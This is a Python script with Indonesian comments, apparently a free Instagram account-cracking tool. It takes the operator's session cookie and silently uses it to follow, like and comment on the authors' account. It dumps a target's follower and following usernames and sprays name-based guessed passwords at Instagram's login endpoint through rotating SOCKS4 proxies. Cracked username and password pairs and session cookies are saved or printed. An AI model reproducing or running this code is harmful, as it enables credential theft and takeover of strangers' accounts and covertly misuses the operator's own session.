# Author : Rozhak & Rahmat
# Jika Ingin Nominal Jangan Ganti Bot Dan Jangan Ganti Authornya
# Tinggal Tambahin Aja
# Note Script Ini 100% Gratis Jangan Di Pejual Belikan !
import os, re, sys, time, json, random, requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from time import sleep
ip = requests.get("https://api.ipify.org").text
# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')

# Logo
___logo___ = ("""      Fuck Tools   \n [#]═══════════════[#]\n      Version 0.1\n     Author Rahmat\n""")
# Login Cookie
def ___login___():
    os.system('clear')
    print(___logo___)
    ___cookie = input("\n[#] Cookie : ")
    if ___cookie in ['', ' ']:
        exit("[!] Jangan Kosong")
    else:
        try:
            ___userid = re.search('ds_user_id=(.*?);', ___cookie);open('Data/user.txt', 'w').write(___userid.group(1))
            ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{___userid.group(1)}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': ___cookie}).json()['user'];open('Data/coki.txt', 'w').write(___cookie)
            print("[#] Welcome : {___roz['full_name']}");___follow___()
        except (AttributeError, KeyError):
            exit("[!] Pastikan Cookie Sudah Benar")
        except (ConnectionError):
            exit("[!] Koneksi Error")
# Follow Cookie
def ___follow___():
    try:
        ___cookie = open('Data/coki.txt', 'r').read()
        ___session = re.search('sessionid=(.*?);', ___cookie)
        ___teks = random.choice(['Hallo Bang 😍','Hai Bang Apa Kabar 😎','Izin Pake Scriptnya 😁','Mantap Bang 😘','Programmer Bang 🤔','Salam Kenal Bang 🤗','I Love You ❤️'])
        ___data = {'comment_text': ___teks,'replied_to_comment_id':''}
        with requests.Session() as ses:
            ___like = ses.post('https://www.instagram.com/web/likes/2734317205115382629/like/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
            ___follow = ses.post('https://www.instagram.com/web/friendships/5398218083/follow/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
            ___komen = ses.post('https://www.instagram.com/web/comments/2734317205115382629/add/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}, data = ___data).text #Jangan Di ubah!
            if '"status":"ok"' in str(___follow):
                print("[#] Login Berhasil");___menu___()
            else:
                print("[!] Cookie Invalid");sleep(3);os.system('rm -rf Data/coki.txt');___login___()
    except Exception as e:
        print("[!] Cookie Invalid");sleep(3);os.system('rm -rf Data/coki.txt');___login___()
# Menu
def ___menu___():
    try:
        os.system('clear')
        print(___logo___)
        ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{open("Data/user.txt","r").read()}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['user']
        print(f"╔═[#] Your Name : {___roz['full_name']}")
        print("╠═[#] Your Ip : %s"%(ip))
        print(f"╠═[#] Follower : {___roz['follower_count']}")
        print("╠═[#] Status : Premium\n║")
    except (IOError):
        print("[!] Cookie Invalid");sleep(3);___login___()
    except (KeyError):
        print("[!] Cookie Invalid");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');sleep(3);___login___()
    except (IOError):
        exit("[!] Koneksi Error")
    print("╠═[1] Dump Username Dari Mengikuti")
    print("╠═[2] Dump Username Dari Pengikut")
    print("╠═[3] Mulai Crack")
    print("╠═[4] Lihat Hasil Crack")
    print("╠═[5] Laporkan Bug")
    print("╠═[0] Keluar")
    ___pilih = input("╠═[#] Pilih : ")
    if ___pilih in ['1','01']:
        ___mengikuti___()
    elif ___pilih in ['2','02']:
        ___pengikut___()
    elif ___pilih in ['3','03']:
        ___proxy___()
    elif ___pilih in ['5','05']:
    	print("║\n╚═[#] Terima Kasih Telah Menggunakan Script Ini....");sleep(3);os.system('xdg-open https://api.whatsapp.com/send/?phone=+6252-1853-9801');exit()
    elif ___pilih in ['4','04']:
        try:
            print("║\n╠═[1] Lihat Hasil Ok")
            print("╠═[2] Lihat Hasil Cp")
            print("╠═[3] Kembali")
            ___hasil = input("║\n╠═[#] Pilih : ")
            if ___hasil in ['1','01']:
                print;os.system('cat Results/Ok.txt')
            elif ___hasil in ['2','02']:
                print;os.system('cat Results/Cp.txt')
            elif ___hasil in ['3','03']:
                ___menu___()
            else:
                exit("║\n╚═[!] Wrong Input")
        except:pass
    elif ___pilih in ['0','00']:
        print("║\n╚═[!] Menghapus Cookie...");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');exit()
    else:
        exit("║\n╚═[!] Wrong Input")
# Dump Mengikuti
def ___mengikuti___():
    try:
        ___user = input("║\n╠═[#] Username : ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit("║\n╚═[!] Gunakan Username")
        else:
            ___roz = requests.get(f'https://www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"╠═[#] Name : {___roz['full_name']}")
            ___ahh = input("╠═[#] Nama File : ")
            print("║")
            ___Crot = (___ahh + '.txt').replace(' ', '_')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/following/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___Crot, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"╠═[#] {z['username']} ---> {z['full_name']}")
            print("║")
            print("╠═[#] Selesai...")
            print(f"╠═[#] File Tersimpan Di : Dump/{___Crot}")
            input("╚═[#] Kembali");___menu___()
    except (KeyError):
        exit("║\n╚═[!] Dump Gagal ")
    except (ConnectionError):
        exit("║\n╚═[!] Koneksi Error")
# Dump Pengikut
def ___pengikut___():
    try:
        ___user = input("║\n╠═[#] Username : ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit("║\n╚═[!] Gunakan Username")
        else:
            ___roz = requests.get(f'https://www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"╠═[#] Name : {___roz['full_name']}")
            ___ahh = input("╠═[#] Nama File : ")
            print("║")
            ___Crot = (___ahh + '.txt').replace(' ', '_')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/followers/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___Crot, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"╠═[#] {z['username']} ---> {z['full_name']}")
            print("║")
            print("╠═[#] Selesai...")
            print(f"╠═[#] File Tersimpan Di : Dump/{___Crot}")
            input("╚═[#] Kembali");___menu___()
    except (KeyError):
        exit("║\n╚═[!] Dump Gagal ")
    except (ConnectionError):
        exit("║\n╚═[!] Koneksi Error")
# Proxy
def ___proxy___():
    try:
        ___roz = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
        open('Data/proxy.txt', 'w').write(___roz)
    except Exception as e:
        ___roz = requests.get('https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/proxy2.txt').text
        open('Data/proxy.txt', 'w').write(___roz)
    ___crack___()
# Crack
class ___crack___:
    
    def __init__(self):
        self.kill = 0
        self.ok = []
        self.cp = []
        print("║\n╠═[1] Password nama, nama123, nama12345")
        print("╠═[2] Password nama, nama123, nama1234, nama12345")
        print("╠═[3] Password nama, nama123, nama1234, nama12345, nama123456")
        print("╠═[4] Gunakan Password Manual")
        ___pilih = input(f"╠═[#] Pilih : ")
        if ___pilih in ['4','04']:
            pwx = input("║\n╠═[#] Password : ").split(',')
        try:
            self.___dump = input("╠═[#] File Dump : ")
            self.___file = open(self.___dump, 'r').read().splitlines()
        except (IOError):
            exit("║\n╚═[!] File Tidak Ada")
        try:
            print("║\n╠═[#] Hasil Ok Tersimpan Di Results/Ok.txt")
            print("╚═[#] Hasil Cp Tersimpan Di Results/Cp.txt\n")
            with ThreadPoolExecutor(max_workers=30) as (___hayuk):
                for ___user in self.___file:
                    username, nama = ___user.split('<=>')
                    z = nama.split(' ')
                    if ___pilih in ['1','01']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'12345']
                    elif ___pilih in ['2','02']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
                    elif ___pilih in ['3','03']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345', z[0]+'123456']
                    elif ___pilih in ['4','04']:
                        password = pwx
                    else:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
                    ___hayuk.submit(self.__main__, self.___file, username, password)
            exit("\nSelesai.....")
        except (ValueError):
            exit("[!] Crack Selesai Sepertinya Ada Yang Error Silahkan Dump Ulang!")
    def __main__(self, user, uid, pwx):
        try:
            ___useragent = open('Data/ua.txt', 'r').read()
        except (IOError):
            ___useragent = ('Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36')
        try:
            for pw in pwx:
                pw = pw.lower()
                ___url = ('https://www.instagram.com/')
                ___login = ('https://www.instagram.com/accounts/login/ajax/')
                ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                ___csrf = requests.get(___url).cookies['csrftoken']
                ___data = {'username': uid,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}',
                'queryParams': {},
                'optIntoOneTap': 'false'}
                ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'x-csrftoken': ___csrf}
                with requests.Session() as ses:
                    response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
                    if 'userId' in str(response):
                        coki = (f'mid={ses.cookies.get_dict()["mid"]};ig_did={ses.cookies.get_dict()["ig_did"]};ig_nrcb=1;shbid="9776\0541986587953\0541674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809\0541986587953\0541674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken={ses.cookies.get_dict()["csrftoken"]};ds_user_id={ses.cookies.get_dict()["ds_user_id"]};sessionid={ses.cookies.get_dict()["sessionid"]};rur="EAG\0541986587953\0541674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"')
                        try:
                            ___roz = requests.get(f'https://www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r╔═[✓] Status : Success Login       ")
                        print(f"╠═[#] Username : {uid}")
                        print(f"╠═[#] Password : {pw}")
                        print(f"╠═[#] Follower : {follower}")
                        print(f"╠═[#] Following : {following}")
                        print(f"╚═[#] Cookie : {coki}\n")
                        self.ok.append(f"{uid}|{pw}")
                        open('Results/Ok.txt','a').write(f"{uid}|{pw}\n")
                        break
                    elif 'checkpoint_required' in str(response):
                        try:
                            ___roz = requests.get(f'https://www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r╔═[×] Status : Checkpoint       ")
                        print(f"╠═[#] Username : {uid}")
                        print(f"╠═[#] Password : {pw}")
                        print(f"╠═[#] Follower : {follower}")
                        print(f"╚═[#] Following : {following}\n")
                        self.cp.append(f"{uid}|{pw}")
                        open('Results/Cp.txt','a').write(f"{uid}|{pw}\n")
                        break
                    elif 'Please wait' in str(response):
                        print("[!] Gunakan Mode Pesawat 2 Detik", end='\r');sleep(7);__main__(self, user, uid, pwx)
                    else:
                        continue
            self.kill +=1
            print(f"[Crack] {self.kill}/{str(len(user))} Cp:{len(self.cp)} Ok:{len(self.ok)}          ", end='\r')
        except (ConnectionError):
            print("[!] Koneksi Error               ", end='\r');sleep(7);__main__(self, user, uid, pwx)
        except:__main__(self, user, uid, pwx)

if __name__=='__main__':
    os.system('git pull')
    ___menu___()
